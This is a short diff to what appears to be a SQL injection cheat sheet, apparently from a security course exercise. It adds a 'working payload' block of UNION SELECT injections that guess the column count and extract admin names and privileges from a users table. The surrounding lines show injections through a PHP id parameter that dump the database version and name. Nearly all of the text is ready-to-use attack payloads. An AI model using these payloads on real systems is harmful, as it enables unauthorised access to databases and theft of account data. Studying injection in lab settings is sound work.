@@ -386,6 +386,10 @@ ORDER BY N--
 /* Good guide on UNION injection */
 http://www.sqlinjection.net/union
 
+/* WORKING PAYLOAD (6443 BREAK) */
+    ' union select null,null, . . . 1 from users      -- keep guessing no. of columns with select null,null,null ...
+    ' union select name,priv from users where priv='admin'--
+
 /* Dump db version + db name */
     ns.agency/stuff.php?id=3 order by 1                                  
     ns.agency/stuff.php?id=0' union select 1,version(),database()-- 
